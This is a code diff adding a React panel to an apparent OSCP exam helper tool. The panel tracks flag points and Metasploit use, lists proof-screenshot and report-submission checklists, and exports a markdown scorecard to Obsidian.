+                        <input type="checkbox" checked={m.proof} onChange={() => toggleFlag(key, "proof")}
+                          style={{ accentColor: "#7ecb9e" }} />
+                        proof.txt +10
+                      </label>
+                    </div>
+                  );
+                })}
+              </div>
+            </div>
+
+            {/* Metasploit tracker */}
+            <div style={{ marginBottom: 24 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>
+                Metasploit Usage — 1 machine only
+              </div>
+              <div style={{ fontSize: 11, color: "#3a4858", marginBottom: 8, letterSpacing: 1 }}>
+                Cannot be used for pivoting. Lock in your choice before you use it.
+              </div>
+              <select
+                value={metasploitUsed}
+                onChange={e => setMetasploitUsed(e.target.value)}
+                style={{
+                  background: "#060a0e", border: "1px solid #1e2838", color: metasploitUsed ? "#f6ad55" : "#3a4858",
+                  padding: "6px 12px", fontFamily: "inherit", fontSize: 13, borderRadius: 2, width: 200,
+                }}
+              >
+                <option value="">— not used yet —</option>
+                <option value="AD Machine 1">AD Machine 1</option>
+                <option value="AD Machine 2">AD Machine 2</option>
+                <option value="AD Domain Controller">AD Domain Controller</option>
+                <option value="Standalone 1">Standalone 1</option>
+                <option value="Standalone 2">Standalone 2</option>
+                <option value="Standalone 3">Standalone 3</option>
+              </select>
+              {metasploitUsed && (
+                <div style={{ fontSize: 11, color: "#f6ad55", marginTop: 6, letterSpacing: 1 }}>
+                  ⚠ Metasploit locked to: {metasploitUsed}
+                </div>
+              )}
+            </div>
+
+            {/* Proof capture checklist */}
+            <div style={{ marginBottom: 24 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 10 }}>
+                Proof Capture Requirements
+              </div>
+              <div style={{ background: "#060a0e", border: "1px solid #e53e3e22", borderRadius: 4, padding: 16, fontSize: 12, lineHeight: 2, color: "#6a7a8a" }}>
+                <div>✦ <span style={{ color: "#cdd6e0" }}>Linux:</span> <code style={{ color: "#7ecb9e" }}>cat /root/proof.txt</code> + <code style={{ color: "#7ecb9e" }}>ip addr</code> — same screenshot</div>
+                <div>✦ <span style={{ color: "#cdd6e0" }}>Windows:</span> <code style={{ color: "#7ecb9e" }}>type proof.txt</code> + <code style={{ color: "#7ecb9e" }}>ipconfig</code> — same screenshot</div>
+                <div>✦ Must be an <span style={{ color: "#e53e3e" }}>interactive shell</span> — webshell = zero points</div>
+                <div>✦ Linux must be <span style={{ color: "#e53e3e" }}>root</span> — Windows must be <span style={{ color: "#e53e3e" }}>SYSTEM or Administrator</span></div>
+                <div>✦ Submit flag hash to control panel <span style={{ color: "#e53e3e" }}>before exam ends</span></div>
+                <div>✦ local.txt = low-priv shell · proof.txt = root/SYSTEM</div>
+                <div>✦ Run from the <span style={{ color: "#cdd6e0" }}>directory where the file lives</span></div>
+              </div>
+            </div>
+
+            {/* Report assembly checklist */}
+            <div style={{ marginBottom: 24 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 10 }}>
+                Report Assembly — 24hr window after exam
+              </div>
+              <div style={{ background: "#060a0e", border: "1px solid #1e2838", borderRadius: 4, padding: 16, fontSize: 12, lineHeight: 2.2, color: "#6a7a8a" }}>
+                <div>✦ Machines graded in <span style={{ color: "#e53e3e" }}>report order</span> — order your best work first</div>
+                <div>✦ For each machine: nmap output, service enum, exploit steps, screenshots, proof</div>
+                <div>✦ Modified exploit: include your modified code inline in PDF</div>
+                <div>✦ Unmodified exploit: include EDB-ID / URL only — no full code paste</div>
+                <div>✦ All scripts/PoCs as <span style={{ color: "#cdd6e0" }}>text inside the PDF</span> — not attachments</div>
+                <div>✦ Export as PDF → archive: <code style={{ color: "#7ecb9e" }}>7z a OSCP-{osid || "OS-XXXXX"}-Exam-Report.7z OSCP-{osid || "OS-XXXXX"}-Exam-Report.pdf</code></div>
+                <div>✦ No password on the archive</div>
+                <div>✦ Max 200MB</div>
+                <div>✦ Upload to: <span style={{ color: "#3b9eff" }}>https://upload.offsec.com</span></div>
+                <div>✦ Filename is <span style={{ color: "#e53e3e" }}>case-sensitive</span></div>
+              </div>
+            </div>
+
+            {/* Notes scratch */}
+            <div style={{ marginBottom: 24 }}>
+              <div style={{ fontSize: 11, letterSpacing: 3, color: "#3a4858", textTransform: "uppercase", marginBottom: 6 }}>
+                Exam Notes
+              </div>
+              <textarea
+                value={examNotes}
+                onChange={e => setExamNotes(e.target.value)}
+                placeholder="IPs, creds found, rabbit holes, time log..."
+                style={{
+                  background: "#060a0e", border: "1px solid #1e2838", color: "#7ecb9e",
+                  padding: "10px 12px", fontFamily: "inherit", fontSize: 13, borderRadius: 2,
+                  width: "100%", minHeight: 80, resize: "vertical", boxSizing: "border-box",
+                  lineHeight: 1.6,
+                }}
+              />
+            </div>
+
+            {/* Copy Obsidian scorecard */}
+            <div style={{ display: "flex", gap: 12, alignItems: "center" }}>
+              <button
+                onClick={() => {
+                  const now = new Date();
+                  const ts = now.toISOString().slice(0,10) + ' ' + now.toTimeString().slice(0,5);
+                  const lines = [];
+                  lines.push('---');
+                  lines.push(`title: "OSCP Exam Scorecard"`);
+                  lines.push(`osid: "${osid}"`);
+                  lines.push(`date: ${ts}`);
+                  lines.push(`score: ${calcScore()}`);
+                  lines.push(`tags: ["exam", "oscp", "scorecard"]`);
+                  lines.push('---');
+                  lines.push('');
+                  lines.push('# OSCP Exam Scorecard');
+                  lines.push(`> ${ts} · Score: **${calcScore()} / 100** · Pass threshold: 70`);
+                  lines.push('');
+                  if (osid) {
+                    lines.push(`**OSID:** ${osid}`);
+                    lines.push(`**Report filename:** OSCP-${osid}-Exam-Report.pdf → OSCP-${osid}-Exam-Report.7z`);
+                    lines.push('');
+                  }
+                  lines.push('## Score Tracker');
+                  lines.push('');
+                  lines.push('### Active Directory (40pts — DC must be owned for any AD points)');
+                  lines.push('| Machine | local.txt | proof.txt | Points |');
+                  lines.push('|---------|-----------|-----------|--------|');
+                  const { ad1, ad2, adc } = machines;
+                  const adScores = adc.proof ? { ad1: ad1.local ? 10 : 0, ad2: ad2.local ? 10 : 0, adc: 20 } : { ad1: 0, ad2: 0, adc: 0 };
+                  lines.push(`| AD Machine 1 | ${ad1.local ? '✅' : '⬜'} | — | ${adScores.ad1} |`);
+                  lines.push(`| AD Machine 2 | ${ad2.local ? '✅' : '⬜'} | — | ${adScores.ad2} |`);
+                  lines.push(`| Domain Controller | — | ${adc.proof ? '✅' : '⬜'} | ${adScores.adc} |`);
+                  lines.push('');
+                  lines.push('### Standalones (60pts)');
+                  lines.push('| Machine | local.txt (+10) | proof.txt (+10) | Points |');
+                  lines.push('|---------|-----------------|-----------------|--------|');
+                  ['sa1','sa2','sa3'].forEach(key => {
+                    const m = machines[key];
+                    const pts = (m.local ? 10 : 0) + (m.proof ? 10 : 0);
+                    lines.push(`| ${m.name} | ${m.local ? '✅' : '⬜'} | ${m.proof ? '✅' : '⬜'} | ${pts} |`);
+                  });
+                  lines.push('');
+                  lines.push(`**Total: ${calcScore()} / 100** ${calcScore() >= 70 ? '🟢 PASSING' : calcScore() >= 50 ? '🟡 NOT YET' : '🔴 BELOW THRESHOLD'}`);
+                  lines.push('');
+                  if (metasploitUsed) {
+                    lines.push(`## Metasploit`);
+                    lines.push(`> ⚠ Locked to: **${metasploitUsed}** — do not use on any other machine`);
+                    lines.push('');
+                  }
+                  lines.push('## Proof Capture Checklist');
+                  lines.push('- [ ] Linux: `cat /root/proof.txt` + `ip addr` same screenshot, root shell, interactive');
+                  lines.push('- [ ] Windows: `type proof.txt` + `ipconfig` same screenshot, SYSTEM/Admin, interactive');
+                  lines.push('- [ ] All flags submitted to control panel before exam ends');
+                  lines.push('');
+                  lines.push('## Report Checklist');
+                  lines.push('- [ ] Machines ordered best-first in report');
+                  lines.push('- [ ] Each machine: nmap, enum, exploit steps, screenshots, proof');
+                  lines.push('- [ ] Modified exploits: code inline in PDF');
+                  lines.push('- [ ] Unmodified exploits: EDB-ID / URL only');
+                  lines.push('- [ ] All scripts as text inside PDF (not attachments)');
+                  lines.push(`- [ ] Export PDF → 7z a OSCP-${osid || 'OS-XXXXX'}-Exam-Report.7z OSCP-${osid || 'OS-XXXXX'}-Exam-Report.pdf`);
+                  lines.push('- [ ] No password on archive · Max 200MB');
+                  lines.push('- [ ] Upload to https://upload.offsec.com');
+                  lines.push('- [ ] Filename case-sensitive — verify before upload');
+                  lines.push('');
+                  if (examNotes) {
+                    lines.push('## Notes');
+                    lines.push(examNotes);
+                    lines.push('');
+                  }
+                  lines.push('---');
+                  lines.push('*The Path — OSCP Field Guide*');
+                  navigator.clipboard.writeText(lines.join('\n'));
+                }}
+                style={{
+                  background: "transparent",
+                  border: "1px solid #7c3aed55",
+                  color: "#a78bfa",
+                  padding: "7px 18px",
+                  cursor: "pointer",
+                  fontFamily: "inherit",
+                  fontSize: 13,
+                  letterSpacing: 2,
+                  borderRadius: 2,
+                  textTransform: "uppercase",
+                }}
+                onMouseEnter={e => e.currentTarget.style.borderColor = "#7c3aed99"}
+                onMouseLeave={e => e.currentTarget.style.borderColor = "#7c3aed55"}
+              >
+                ⟡ copy scorecard to obsidian
+              </button>
+              <button
+                onClick={() => setShowReport(false)}
+                style={{
+                  background: "transparent",
+                  border: "1px solid #1e2838",
+                  color: "#3a4858",
+                  padding: "7px 18px",
+                  cursor: "pointer",
+                  fontFamily: "inherit",
+                  fontSize: 13,
+                  letterSpacing: 2,
+                  borderRadius: 2,
+                  textTransform: "uppercase",
+                }}
+              >
+                esc close
+              </button>
+            </div>
+
+            <div style={{ marginTop: 16, fontSize: 10, color: "#1e2838", letterSpacing: 1 }}>
+              Press E to open · ESC to close · State resets on page refresh · Not affiliated with OffSec
+            </div>
+          </div>
+        </div>
+      )}
 
       {/* ── ABOUT MODAL ────────────────────── */}
       {showAbout && (
